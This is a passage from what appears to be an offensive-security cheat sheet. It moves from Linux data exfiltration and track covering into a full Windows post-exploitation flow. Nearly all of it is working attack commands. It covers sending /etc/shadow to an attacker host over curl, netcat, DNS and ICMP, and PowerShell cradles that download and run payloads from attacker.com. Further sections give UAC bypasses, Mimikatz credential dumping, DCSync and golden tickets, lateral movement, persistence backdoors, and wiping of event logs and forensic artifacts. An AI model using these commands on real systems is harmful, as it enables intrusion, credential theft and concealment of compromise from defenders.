nc -lvnp 8000

# On target
curl -X POST -F "file=@/tmp/shadow.txt" http://attacker_ip:8000/
```

**Base64 Encoding for Terminal Copy**

```bash
base64 /etc/shadow
# Copy output manually from terminal
```

**DNS Exfiltration**

```bash
# Split data into chunks and send as DNS queries
xxd -p /tmp/data.txt | while read line; do
    dig $line.attacker_domain.com
done
```

**SCP/SFTP**

```bash
scp /tmp/shadow.txt attacker@attacker_ip:/tmp/
```

**Netcat Transfer**

```bash
# On attacker machine
nc -lvnp 4444 > received_file

# On target
nc attacker_ip 4444 < /tmp/shadow.txt
```

**ICMP Exfiltration**

```bash
# On attacker machine
tcpdump -i eth0 icmp

# On target
xxd -p /tmp/data.txt | while read line; do
    ping -c 1 -p $line attacker_ip
done
```

### Track Covering

Remove evidence of compromise to avoid detection.

#### Log Cleaning

**Clear Command History**

```bash
history -c                          # Clear current session history
echo "" > ~/.bash_history           # Clear bash history file
cat /dev/null > ~/.bash_history     # Alternative method
unset HISTFILE                      # Disable history logging
export HISTFILESIZE=0               # Limit history size to 0
```

**System Log Clearing**

```bash
# Clear specific logs
echo "" > /var/log/auth.log
echo "" > /var/log/syslog
echo "" > /var/log/messages

# Remove specific entries (grep inverse match)
grep -v "suspicious_activity" /var/log/auth.log > /tmp/auth.log
cat /tmp/auth.log > /var/log/auth.log
rm /tmp/auth.log
```

**Wtmp/Utmp Cleaning**

```bash
# Remove login records
echo "" > /var/log/wtmp
echo "" > /var/log/btmp
echo "" > /var/run/utmp
```

#### File Timestamp Manipulation

**Touch Command**

```bash
# Match timestamps with another file
touch -r /etc/passwd /path/to/backdoor

# Set specific timestamp
touch -t 202401011200 /path/to/backdoor  # YYYYMMDDhhmm
```

#### Artifact Removal

**Remove Uploaded Files**

```bash
rm /tmp/exploit
rm /tmp/*.c
rm /tmp/*.so
shred -vfz -n 10 /tmp/sensitive_file    # Secure deletion
```

**Remove Backdoors**

```bash
# Remove SUID backdoors
find / -perm -4000 -user root -name ".hidden*" -delete 2>/dev/null

# Remove cron jobs
crontab -r
rm /etc/cron.d/backdoor

# Remove systemd services
systemctl stop backdoor.service
systemctl disable backdoor.service
rm /etc/systemd/system/backdoor.service
systemctl daemon-reload
```

#### Process Hiding

[Inference] Process hiding techniques are beyond basic track covering and involve kernel-level manipulation or rootkit installation, which may not be practical in CTF scenarios.

**Basic Process Obfuscation**

```bash
# Rename process
cp /bin/bash /usr/local/bin/system_update
/usr/local/bin/system_update
```

---

### Important Related Topics

For comprehensive Linux exploitation, consider studying:

- **Linux Enumeration Scripts**: LinPEAS, LinEnum, Linux Smart Enumeration
- **Container Escape Techniques**: Docker, LXC/LXD privilege escalation
- **Password Cracking**: John the Ripper, Hashcat for captured hashes
- **Post-Exploitation Frameworks**: Metasploit post modules, Empire
- **Advanced Persistence**: Kernel module rootkits, bootkit installation

---

## Windows Exploitation Flow

### System Enumeration

#### Basic System Information

**OS & Architecture Details**

```powershell
# System information
systeminfo
systeminfo | findstr /B /C:"OS Name" /C:"OS Version" /C:"System Type"

# Hostname
hostname

# Current user context
whoami
whoami /priv
whoami /groups
whoami /all

# Environment variables
set
Get-ChildItem Env: | Format-Table -AutoSize

# PowerShell version
$PSVersionTable
```

**Network Configuration**

```powershell
# Network interfaces
ipconfig /all
Get-NetIPConfiguration
Get-NetIPAddress

# Routing table
route print
Get-NetRoute

# ARP cache
arp -a
Get-NetNeighbor

# Active connections
netstat -ano
Get-NetTCPConnection | Select-Object LocalAddress,LocalPort,RemoteAddress,RemotePort,State,OwningProcess

# DNS cache
ipconfig /displaydns
Get-DnsClientCache

# Firewall status
netsh advfirewall show allprofiles
Get-NetFirewallProfile
Get-NetFirewallRule | Where-Object {$_.Enabled -eq 'True'} | Select-Object DisplayName,Direction,Action
```

**Execution Policy Assessment**

```powershell
# Check current policy
Get-ExecutionPolicy
Get-ExecutionPolicy -List

# Policy bypass methods
powershell -ExecutionPolicy Bypass -File script.ps1
powershell -ep bypass
powershell -c "IEX(New-Object Net.WebClient).DownloadString('http://attacker.com/script.ps1')"

# Download and execute bypass
powershell -nop -c "iex(New-Object Net.WebClient).DownloadString('http://attacker.com/payload.ps1')"

# Encoded command bypass
$command = 'Write-Host "Bypassed"'
$bytes = [System.Text.Encoding]::Unicode.GetBytes($command)
$encodedCommand = [Convert]::ToBase64String($bytes)
powershell -EncodedCommand $encodedCommand
```

**User Enumeration**

```powershell
# Current user details
net user %username%
Get-LocalUser
Get-LocalUser | Select-Object Name,Enabled,LastLogon

# Local users
net user
Get-LocalUser | Format-Table Name,Enabled,PasswordRequired,PasswordLastSet

# Domain users (if domain-joined)
net user /domain
Get-ADUser -Filter * -Properties *

# Currently logged users
query user
qwinsta

# User sessions
net session
```

**Group Enumeration**

```powershell
# Local groups
net localgroup
Get-LocalGroup

# Administrators group
net localgroup Administrators
Get-LocalGroupMember -Group "Administrators"

# Domain groups
net group /domain
Get-ADGroup -Filter * | Select-Object Name,GroupScope,GroupCategory

# User's group membership
net user %username% | findstr /C:"Local Group" /C:"Global Group"
```

---

### Patch Level Assessment

#### Windows Update Status

**Update History**

```powershell
# List installed updates (CMD)
wmic qfe list full
wmic qfe get Caption,Description,HotFixID,InstalledOn

# PowerShell method
Get-HotFix | Sort-Object -Property InstalledOn -Descending
Get-HotFix | Format-Table -AutoSize HotFixID,Description,InstalledBy,InstalledOn

# Specific KB search
wmic qfe get HotFixID | findstr KB4530715
Get-HotFix -Id KB4530715

# Last update date
Get-HotFix | Select-Object -First 1 InstalledOn
```

**Update Configuration**

```powershell
# Windows Update settings
reg query "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\WindowsUpdate\Auto Update" /v AUOptions

# WSUS configuration
reg query "HKLM\SOFTWARE\Policies\Microsoft\Windows\WindowsUpdate" /v WUServer

# Update service status
sc query wuauserv
Get-Service -Name wuauserv
```

**Vulnerability Identification**

[Inference: These techniques help identify exploitable patch gaps]

```powershell
# Export system info for offline analysis
systeminfo > systeminfo.txt

# Transfer to Kali for analysis with windows-exploit-suggester
python windows-exploit-suggester.py --database 2024-10-12-mssb.xls --systeminfo systeminfo.txt

# Alternative: WES-NG (Windows Exploit Suggester - Next Generation)
wes.py systeminfo.txt -i "Elevation of Privilege" --exploits-only
```

**Manual Vulnerability Checks**

_Common Unpatched Vulnerabilities_

```powershell
# MS16-032 (Secondary Logon Handle)
# Affects: Windows 7-10, Server 2008-2016
wmic qfe get HotFixID | findstr KB3139914

# MS15-051 (Windows Client Copy Image)
wmic qfe get HotFixID | findstr KB3045171

# MS14-058 (TrackPopupMenu Win32k.sys)
wmic qfe get HotFixID | findstr KB3000061

# CVE-2021-1675 (PrintNightmare)
wmic qfe get HotFixID | findstr KB5004945
```

---

### Service and Task Enumeration

#### Running Services

**Service Discovery**

```powershell
# All services (CMD)
net start
sc query
sc query state= all

# PowerShell enumeration
Get-Service | Where-Object {$_.Status -eq "Running"}
Get-Service | Format-Table Name,DisplayName,Status,StartType -AutoSize

# Vulnerable service permissions
accesschk.exe -uwcqv "Authenticated Users" * /accepteula
accesschk.exe -uwcqv %USERNAME% * /accepteula

# Service executable paths
wmic service get name,displayname,pathname,startmode | findstr /i "auto" | findstr /i /v "c:\windows\\" | findstr /i /v """

# Unquoted service paths
wmic service get name,pathname | findstr /i /v "C:\Windows\\" | findstr /i /v """
```

**Service Configuration Details**

```powershell
# Specific service details
sc qc ServiceName
Get-Service ServiceName | Select-Object *

# Service binary path
sc qc ServiceName | findstr BINARY_PATH_NAME

# Service permissions
accesschk.exe -ucqv ServiceName

# Services running as SYSTEM
wmic service where "startname='LocalSystem'" get name,pathname,startmode
Get-WmiObject win32_service | Where-Object {$_.StartName -eq 'LocalSystem'} | Select-Object Name,PathName,StartMode
```

**DLL Hijacking Opportunities**

```powershell
# Check service DLL search order
Get-ItemProperty "HKLM:\SYSTEM\CurrentControlSet\Control\Session Manager" -Name SafeDllSearchMode

# List loaded DLLs for running processes
tasklist /m
Get-Process | Select-Object ProcessName,Modules -ExpandProperty Modules

# Find missing DLLs (requires Process Monitor or similar)
# Look for NAME NOT FOUND results in writable directories
```

#### Scheduled Tasks

**Task Enumeration**

```powershell
# List all scheduled tasks (CMD)
schtasks /query /fo LIST /v
schtasks /query /fo CSV /v

# PowerShell method
Get-ScheduledTask | Where-Object {$_.State -ne "Disabled"}
Get-ScheduledTask | Get-ScheduledTaskInfo

# Tasks running as SYSTEM
schtasks /query /fo LIST /v | findstr /B /C:"Task To Run" /C:"Run As User"
Get-ScheduledTask | Where-Object {$_.Principal.UserId -eq "S-1-5-18"}

# Task details
schtasks /query /TN "TaskName" /v /fo LIST
Get-ScheduledTask -TaskName "TaskName" | Get-ScheduledTaskInfo
```

**Writable Task Exploitation**

```powershell
# Check task executable permissions
icacls "C:\Path\To\Task\Executable.exe"
Get-Acl "C:\Path\To\Task\Executable.exe" | Format-List

# Modify task (requires permissions)
schtasks /change /TN "TaskName" /TR "C:\malicious.exe" /RU SYSTEM

# Create malicious task
schtasks /create /tn "TaskName" /tr "C:\payload.exe" /sc ONLOGON /ru SYSTEM
```

#### Startup Programs

**Autorun Locations**

```powershell
# Registry Run keys
reg query HKLM\Software\Microsoft\Windows\CurrentVersion\Run
reg query HKLM\Software\Microsoft\Windows\CurrentVersion\RunOnce
reg query HKCU\Software\Microsoft\Windows\CurrentVersion\Run
reg query HKCU\Software\Microsoft\Windows\CurrentVersion\RunOnce

# PowerShell registry query
Get-ItemProperty "HKLM:\Software\Microsoft\Windows\CurrentVersion\Run"
Get-ItemProperty "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run"

# Startup folder
dir "C:\Users\%USERNAME%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup"
dir "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup"
```

**WMI Event Subscriptions**

```powershell
# Permanent WMI event subscriptions
Get-WmiObject -Namespace root\subscription -Class __EventFilter
Get-WmiObject -Namespace root\subscription -Class __EventConsumer
Get-WmiObject -Namespace root\subscription -Class __FilterToConsumerBinding
```

---

### UAC and Token Analysis

#### UAC Status

**UAC Configuration**

```powershell
# UAC level
reg query HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\System /v EnableLUA
reg query HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\System /v ConsentPromptBehaviorAdmin

# Interpretation:
# EnableLUA = 0: UAC disabled
# EnableLUA = 1: UAC enabled
# ConsentPromptBehaviorAdmin = 0: Elevate without prompting
# ConsentPromptBehaviorAdmin = 2: Prompt for consent (default)
```

**UAC Bypass Techniques**

[Inference: These methods exploit UAC auto-elevation]

_FodHelper (Windows 10)_

```powershell
# Registry modification
New-Item "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Force
New-ItemProperty -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Name "DelegateExecute" -Value "" -Force
Set-ItemProperty -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Name "(default)" -Value "C:\payload.exe" -Force

# Trigger
Start-Process "C:\Windows\System32\fodhelper.exe"

# Cleanup
Remove-Item "HKCU:\Software\Classes\ms-settings" -Recurse -Force
```

_Eventvwr (Event Viewer)_

```powershell
# Registry hijack
New-Item "HKCU:\Software\Classes\mscfile\shell\open\command" -Force
Set-ItemProperty -Path "HKCU:\Software\Classes\mscfile\shell\open\command" -Name "(default)" -Value "C:\payload.exe" -Force

# Execute
Start-Process "C:\Windows\System32\eventvwr.exe"
```

_ComputerDefaults_

```powershell
New-Item "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Force
Set-ItemProperty -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Name "(default)" -Value "C:\payload.exe" -Force
Start-Process "C:\Windows\System32\ComputerDefaults.exe"
```

#### Token Privileges

**Current Token Analysis**

```powershell
# List privileges
whoami /priv

# Key privileges for exploitation:
# SeImpersonatePrivilege - Potato attacks
# SeAssignPrimaryTokenPrivilege - Token manipulation
# SeBackupPrivilege - Read any file
# SeRestorePrivilege - Write any file
# SeDebugPrivilege - Access any process
# SeTakeOwnershipPrivilege - Take ownership of objects
# SeLoadDriverPrivilege - Load kernel drivers
```

**Token Impersonation**

```powershell
# Check for impersonation privileges
whoami /priv | findstr Impersonate

# Potato exploit family (if SeImpersonate/SeAssignPrimaryToken exists):
# - JuicyPotato (Windows 7-Server 2019)
# - RoguePotato (Windows 10/Server 2019+)
# - PrintSpoofer (Modern Windows)
# - GodPotato (Latest technique)
```

**Integrity Level**

```powershell
# Check current integrity level
whoami /groups | findstr Level

# Levels:
# Untrusted: S-1-16-0
# Low: S-1-16-4096
# Medium: S-1-16-8192
# High: S-1-16-12288
# System: S-1-16-16384
```

---

### Privilege Escalation Techniques

#### Automated Enumeration Tools

**PowerUp (PowerSploit)**

```powershell
# Load PowerUp
IEX(New-Object Net.WebClient).DownloadString('http://attacker.com/PowerUp.ps1')
Import-Module .\PowerUp.ps1

# Run all checks
Invoke-AllChecks

# Specific checks
Get-ServiceUnquoted
Get-ModifiableServiceFile
Get-ModifiableService
Get-ServicePermission
Get-UnattendedInstallFile
Get-Webconfig
Get-ApplicationHost
Get-RegAutoLogon
Get-ModifiableRegistryAutoRun
Get-ModifiableScheduledTaskFile
```

**WinPEAS**

```cmd
# Execute WinPEAS
winPEASx64.exe
winPEASx64.exe quiet

# Fast scan
winPEASx64.exe fast

# Output to file
winPEASx64.exe > winpeas_output.txt
```

**Seatbelt**

```powershell
# Full system checks
Seatbelt.exe -group=all

# Specific modules
Seatbelt.exe -group=system
Seatbelt.exe -group=user
Seatbelt.exe -group=misc

# Output to file
Seatbelt.exe -group=all -outputfile="seatbelt.txt"
```

#### Credential Discovery

**Registry Credentials**

```powershell
# Autologon credentials
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultUserName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultPassword

# VNC passwords
reg query "HKCU\Software\ORL\WinVNC3\Password"
reg query "HKLM\SOFTWARE\RealVNC\WinVNC4" /v password

# PuTTY stored sessions
reg query "HKCU\Software\SimonTatham\PuTTY\Sessions"

# Credential Manager
cmdkey /list
```

**Configuration Files**

```powershell
# Search for common credential files
dir /s *pass* == *cred* == *vnc* == *.config*

# Unattend files
dir /s *unattend.xml
dir /s *sysprep.inf
dir /s *sysprep.xml

# Web.config files
dir /s web.config
Get-ChildItem -Path C:\ -Filter web.config -Recurse -ErrorAction SilentlyContinue

# Check web.config for credentials
findstr /si password *.xml *.ini *.txt *.config
```

**PowerShell History**

```powershell
# PowerShell command history
type %APPDATA%\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
Get-Content (Get-PSReadlineOption).HistorySavePath

# Transcript files
Get-ChildItem -Path C:\ -Filter *transcript* -Recurse -ErrorAction SilentlyContinue
```

**Network Credentials**

```powershell
# Saved RDP connections
reg query "HKEY_CURRENT_USER\Software\Microsoft\Terminal Server Client\Default"

# Wi-Fi passwords
netsh wlan show profiles
netsh wlan show profile name="SSID" key=clear

# Credential Guard status
reg query "HKLM\SYSTEM\CurrentControlSet\Control\LSA" /v LsaCfgFlags
```

#### Kernel Exploits

**Exploit Identification**

```powershell
# Use windows-exploit-suggester output
# Look for local privilege escalation exploits

# Common kernel exploits:
# MS16-032 - Secondary Logon
# MS16-135 - Win32k.sys
# MS17-017 - GDI Palette Objects
# CVE-2018-8120 - Win32k Elevation
# CVE-2019-0841 - NTLM SSP
# CVE-2021-36934 - HiveNightmare/SeriousSAM
```

**Exploit Execution Example**

```powershell
# Upload compiled exploit
certutil -urlcache -split -f http://attacker.com/exploit.exe exploit.exe

# Execute
.\exploit.exe

# Verify elevated privileges
whoami /priv
```

---

### Domain Enumeration

#### Domain Information Gathering

**Basic Domain Enumeration**

```powershell
# Domain name
echo %USERDOMAIN%
[System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()

# Domain controllers
nltest /dclist:%USERDOMAIN%
Get-ADDomainController -Filter * | Select-Object Name,IPv4Address,OperatingSystem

# Domain SID
whoami /user

# Domain functional level
Get-ADDomain | Select-Object DomainMode,Forest,Name
```

**User Enumeration**

```powershell
# All domain users
net user /domain
Get-ADUser -Filter * | Select-Object Name,SamAccountName,Enabled

# User details
net user username /domain
Get-ADUser -Identity username -Properties *

# Domain admins
net group "Domain Admins" /domain
Get-ADGroupMember -Identity "Domain Admins" -Recursive

# Enterprise admins
net group "Enterprise Admins" /domain

# Administrator accounts
Get-ADUser -Filter {adminCount -eq 1} -Properties adminCount
```

**Group Enumeration**

```powershell
# All groups
net group /domain
Get-ADGroup -Filter * | Select-Object Name,GroupScope

# Group members
net group "GroupName" /domain
Get-ADGroupMember -Identity "GroupName" -Recursive

# User's groups
net user username /domain | findstr /i "group"
Get-ADPrincipalGroupMembership -Identity username | Select-Object Name
```

**Computer Enumeration**

```powershell
# Domain computers
net view /domain
Get-ADComputer -Filter * | Select-Object Name,OperatingSystem,IPv4Address

# Domain controllers
nltest /dclist:
Get-ADDomainController -Filter *

# Specific OS version
Get-ADComputer -Filter {OperatingSystem -like "*Server*"} -Properties *
```

#### PowerView (Active Directory Reconnaissance)

**Installation**

```powershell
# Download PowerView
IEX(New-Object Net.WebClient).DownloadString('http://attacker.com/PowerView.ps1')
Import-Module .\PowerView.ps1
```

**Domain Enumeration Commands**

```powershell
# Domain information
Get-Domain
Get-DomainController
Get-DomainPolicy

# User enumeration
Get-DomainUser
Get-DomainUser -Identity username -Properties *
Get-DomainUser -SPN

# Group enumeration
Get-DomainGroup
Get-DomainGroupMember -Identity "Domain Admins"
Get-DomainGroup -AdminCount

# Computer enumeration
Get-DomainComputer
Get-DomainComputer -OperatingSystem "*Server*"

# Find local admin access
Find-LocalAdminAccess
Find-DomainLocalGroupMember -GroupName Administrators

# Session enumeration
Get-NetSession -ComputerName dc01
Get-NetLoggedon -ComputerName dc01
```

**Trust Enumeration**

```powershell
# Domain trusts
Get-DomainTrust
Get-DomainTrustMapping

# Forest trusts
Get-ForestDomain
Get-ForestTrust
```

**GPO Enumeration**

```powershell
# Group Policy Objects
Get-DomainGPO
Get-DomainGPOLocalGroup
Get-DomainGPOUserLocalGroupMapping
```

**Kerberos Attacks Setup**

```powershell
# Find SPNs (Kerberoasting prep)
Get-DomainUser -SPN | Select-Object samaccountname,serviceprincipalname

# AS-REP Roasting targets
Get-DomainUser -PreauthNotRequired
```

---

### Credential Harvesting

#### Mimikatz

**Loading Mimikatz**

```powershell
# Execute binary
mimikatz.exe

# PowerShell version (Invoke-Mimikatz)
IEX(New-Object Net.WebClient).DownloadString('http://attacker.com/Invoke-Mimikatz.ps1')
Invoke-Mimikatz

# Load from memory (reflective DLL injection)
Invoke-ReflectivePEInjection -PEBytes $bytes -ExeArgs "sekurlsa::logonpasswords"
```

**Basic Commands**

```powershell
# Enable debug privilege
privilege::debug

# Dump credentials from LSASS
sekurlsa::logonpasswords

# Dump all credentials
sekurlsa::logonpasswords full

# Dump tickets
sekurlsa::tickets

# Export tickets
sekurlsa::tickets /export

# Dump credential manager
vault::cred
vault::list
```

**NTLM Hash Extraction**

```powershell
# Dump NTLM hashes
lsadump::sam

# Dump LSA secrets
lsadump::secrets

# DCSync attack (requires replication rights)
lsadump::dcsync /domain:domain.com /user:Administrator
lsadump::dcsync /domain:domain.com /all /csv
```

**Pass-the-Hash**

```powershell
# PTH with mimikatz
sekurlsa::pth /user:Administrator /domain:domain.com /ntlm:hash /run:cmd.exe

# PTH with Invoke-Mimikatz
Invoke-Mimikatz -Command '"sekurlsa::pth /user:admin /domain:domain.com /ntlm:hash /run:powershell.exe"'
```

**Pass-the-Ticket**

```powershell
# Export tickets
sekurlsa::tickets /export

# Import ticket
kerberos::ptt ticket.kirbi

# List current tickets
kerberos::list

# Purge tickets
kerberos::purge
```

**Golden Ticket**

```powershell
# Dump krbtgt hash
lsadump::dcsync /domain:domain.com /user:krbtgt

# Create golden ticket
kerberos::golden /user:Administrator /domain:domain.com /sid:S-1-5-21-... /krbtgt:hash /id:500 /ptt

# Verify
klist
```

**Silver Ticket**

```powershell
# Create silver ticket for specific service
kerberos::golden /user:Administrator /domain:domain.com /sid:S-1-5-21-... /target:server.domain.com /service:cifs /rc4:hash /ptt
```

#### Alternative Credential Dumping

**ProcDump + Mimikatz**

```powershell
# Dump LSASS process
procdump.exe -accepteula -ma lsass.exe lsass.dmp

# Offline analysis with Mimikatz
mimikatz.exe "sekurlsa::minidump lsass.dmp" "sekurlsa::logonpasswords" exit
```

**LaZagne**

```powershell
# Dump all credentials
laZagne.exe all

# Specific module
laZagne.exe browsers
laZagne.exe wifi

# Output to file
laZagne.exe all -oN output.txt
```

**SAM/SYSTEM Registry Hives**

```powershell
# Save registry hives
reg save HKLM\SAM C:\sam.hive
reg save HKLM\SYSTEM C:\system.hive
reg save HKLM\SECURITY C:\security.hive

# Extract on Kali
impacket-secretsdump -sam sam.hive -system system.hive LOCAL
```

---

### Lateral Movement Setup

#### PSExec

**Sysinternals PSExec**

```cmd
# Execute command remotely
psexec.exe \\target -u domain\user -p password cmd.exe

# Interactive shell as SYSTEM
psexec.exe \\target -s cmd.exe

# Copy and execute binary
psexec.exe \\target -c payload.exe
```

**Impacket PSExec**

```bash
# From Kali
impacket-psexec domain/user:password@target_ip
impacket-psexec -hashes :ntlm_hash domain/user@target_ip
```

#### WMI Execution

**WMIC**

```cmd
# Execute command remotely
wmic /node:target /user:domain\user /password:password process call create "cmd.exe /c command"

# Upload and execute
wmic /node:target /user:domain\user /password:password process call create "powershell -c IEX(New-Object Net.WebClient).DownloadString('http://attacker.com/payload.ps1')"
```

**PowerShell WMI**

```powershell
# Create credentials
$user = "domain\username"
$pass = ConvertTo-SecureString "password" -AsPlainText -Force
$cred = New-Object System.Management.Automation.PSCredential($user, $pass)

# Execute command
Invoke-WmiMethod -Class Win32_Process -Name Create -ArgumentList "cmd.exe /c command" -ComputerName target -Credential $cred

# Interactive session
$session = New-CimSession -ComputerName target -Credential $cred
Invoke-CimMethod -CimSession $session -ClassName Win32_Process -MethodName Create -Arguments @{CommandLine="calc.exe"}
```

#### WinRM

**Enable WinRM**

```powershell
# Enable WinRM
Enable-PSRemoting -Force

# Configure trusted hosts
Set-Item WSMan:\localhost\Client\TrustedHosts -Value "*" -Force
```

**Remote Execution**

```powershell
# Enter interactive session
Enter-PSSession -ComputerName target -Credential domain\user

# Execute single command
Invoke-Command -ComputerName target -Credential $cred -ScriptBlock {whoami}

# Execute script
Invoke-Command -ComputerName target -Credential $cred -FilePath script.ps1

# Multiple targets
Invoke-Command -ComputerName target1,target2,target3 -Credential $cred -ScriptBlock {Get-Process}
```

#### RDP

**Enable RDP**

```powershell
# Enable RDP via registry
reg add "HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f

# Firewall rule
netsh advfirewall firewall set rule group="remote desktop" new enable=Yes

# PowerShell method
Set-ItemProperty -Path 'HKLM:\System\CurrentControlSet\Control\Terminal Server' -Name "fDenyTSConnections" -Value 0
Enable-NetFirewallRule -DisplayGroup "Remote Desktop"
```

**RDP Connection**

```bash
# From Kali
xfreerdp /u:username /p:password /v:target_ip /cert-ignore
rdesktop -u username -p password target_ip
```

---

### Persistence Mechanisms

#### Registry Run Keys

**Autorun Persistence**

```powershell
# Current user
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v "Backdoor" /t REG_SZ /d "C:\payload.exe" /f

# All users (requires admin)
reg add "HKLM\Software\Microsoft\Windows\CurrentVersion\Run" /v "Backdoor" /t REG_SZ /d "C:\payload.exe" /f

# RunOnce
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\RunOnce" /v "Backdoor" /t REG_SZ /d "C:\payload.exe" /f
```

#### Scheduled Task Persistence

**Create Scheduled Task**

```powershell
# Run on logon
schtasks /create /tn "WindowsUpdate" /tr "C:\payload.exe" /sc onlogon /ru SYSTEM

# Run every hour
schtasks /create /tn "Updater" /tr "powershell -WindowStyle Hidden -c IEX(New-Object Net.WebClient).DownloadString('http://attacker.com/payload.ps1')" /sc hourly /ru SYSTEM

# PowerShell method
$action = New-ScheduledTaskAction -Execute "C:\payload.exe"
$trigger = New-ScheduledTaskTrigger -AtLogOn
Register-ScheduledTask -TaskName "WindowsUpdate" -Action $action -Trigger $trigger -RunLevel Highest
```

#### Service Persistence

**Create Malicious Service**

```cmd
# Create service
sc create "WindowsUpdate" binPath= "C:\payload.exe" start= auto
sc description "WindowsUpdate" "Critical Windows Update Service"

# Start service
net start "WindowsUpdate"
sc start "WindowsUpdate"
```

#### WMI Event Subscription

**Permanent WMI Event**

```powershell
# Create event filter (trigger)
$filter = Set-WmiInstance -Namespace root\subscription -Class __EventFilter -Arguments @{
    Name = "SystemFilter"
    EventNamespace = "root\cimv2"
    QueryLanguage = "WQL"
    Query = "SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System'"
}

# Create event consumer (action)
$consumer = Set-WmiInstance -Namespace root\subscription -Class CommandLineEventConsumer -Arguments @{
    Name = "SystemConsumer"
    CommandLineTemplate = "C:\payload.exe"
}

# Bind filter to consumer
Set-WmiInstance -Namespace root\subscription -Class __FilterToConsumerBinding -Arguments @{
    Filter = $filter
    Consumer = $consumer
}
```

#### Startup Folder

**Place File in Startup**

```powershell
# Current user startup
copy payload.exe "%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\update.exe"

# All users startup (requires admin)
copy payload.exe "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup\update.exe"
```

---

### Cleanup and Track Covering

#### Event Log Clearing

**Clear Event Logs**

```powershell
# Clear all logs
for /f %x in ('wevtutil el') do wevtutil cl "%x"

# Specific logs
wevtutil cl System
wevtutil cl Security
wevtutil cl Application

# PowerShell method
Clear-EventLog -LogName System,Security,Application
Get-EventLog -List | ForEach-Object {Clear-EventLog $_.Log}
```

**Disable Event Logging**

```powershell
# Disable auditing
auditpol /set /category:* /success:disable /failure:disable

# Stop event log service (requires SYSTEM)
sc stop eventlog
net stop eventlog
```

#### File Artifacts

**Delete Files Securely**

```powershell
# Delete file
del /f /s /q C:\path\to\artifact

# Overwrite before deletion (using cipher)

cipher /w:C:\path\to\folder

# PowerShell secure delete

Remove-Item C:\path\to\file -Force

# Note: Standard deletion doesn't overwrite data

````

**Clear Prefetch**
```powershell
# Delete prefetch files (execution history)
del /f /q C:\Windows\Prefetch\*.pf

# PowerShell method
Remove-Item C:\Windows\Prefetch\*.pf -Force
````

**Clear Recent Files**

```powershell
# User recent files
del /f /q %APPDATA%\Microsoft\Windows\Recent\*

# Recent documents registry
reg delete "HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\RecentDocs" /f
```

**Clear Jump Lists**

```powershell
# Automatic destinations
del /f /q %APPDATA%\Microsoft\Windows\Recent\AutomaticDestinations\*

# Custom destinations
del /f /q %APPDATA%\Microsoft\Windows\Recent\CustomDestinations\*
```

#### Registry Artifacts

**USN Journal**

```powershell
# Delete USN journal (change log)
fsutil usn deletejournal /d C:

# Query journal first
fsutil usn queryjournal C:
```

**ShimCache (AppCompatCache)**

```powershell
# Clear AppCompatCache
reg delete "HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\AppCompatCache" /f

# Note: Requires reboot to fully clear
```

**UserAssist**

```powershell
# Delete UserAssist (tracks program execution)
reg delete "HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\UserAssist" /f
```

**BAM/DAM (Background Activity Moderator)**

```powershell
# Clear BAM entries (Windows 10+)
reg delete "HKLM\SYSTEM\CurrentControlSet\Services\bam\UserSettings" /f
reg delete "HKLM\SYSTEM\CurrentControlSet\Services\dam\UserSettings" /f
```

#### Network Artifacts

**Clear ARP Cache**

```powershell
# Flush ARP table
arp -d *
netsh interface ip delete arpcache
```

**Clear DNS Cache**

```powershell
# Flush DNS resolver cache
ipconfig /flushdns
Clear-DnsClientCache
```

**Clear NetBIOS Cache**

```powershell
# Flush NetBIOS name cache
nbtstat -R
nbtstat -RR
```

**Firewall Log Clearing**

```powershell
# Default firewall log location
del /f C:\Windows\system32\LogFiles\Firewall\pfirewall.log

# Disable firewall logging
netsh advfirewall set allprofiles logging droppedconnections disable
netsh advfirewall set allprofiles logging allowedconnections disable
```

#### PowerShell History

**Clear PowerShell History**

```powershell
# Clear session history
Clear-History

# Delete history file
Remove-Item (Get-PSReadlineOption).HistorySavePath

# Clear all users' history
Remove-Item C:\Users\*\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt -Force

# Disable history logging
Set-PSReadlineOption -HistorySaveStyle SaveNothing
```

**Clear PowerShell Transcripts**

```powershell
# Find transcript files
Get-ChildItem -Path C:\ -Filter *transcript* -Recurse -ErrorAction SilentlyContinue

# Delete transcripts
Remove-Item C:\Transcripts\* -Force -Recurse

# Disable transcription
Stop-Transcript
```

#### Process and Service Cleanup

**Stop and Remove Services**

```powershell
# Stop service
sc stop "ServiceName"
net stop "ServiceName"

# Delete service
sc delete "ServiceName"

# PowerShell method
Stop-Service -Name "ServiceName"
Remove-Service -Name "ServiceName"  # PowerShell 6.0+
```

**Kill Processes**

```powershell
# Kill specific process
taskkill /F /PID process_id
taskkill /F /IM process_name.exe

# PowerShell method
Stop-Process -Id process_id -Force
Stop-Process -Name process_name -Force

# Kill all instances
Get-Process process_name | Stop-Process -Force
```

**Remove Scheduled Tasks**

```powershell
# Delete task
schtasks /delete /tn "TaskName" /f

# PowerShell method
Unregister-ScheduledTask -TaskName "TaskName" -Confirm:$false
```

#### WMI Cleanup

**Remove WMI Persistence**

```powershell
# List event filters
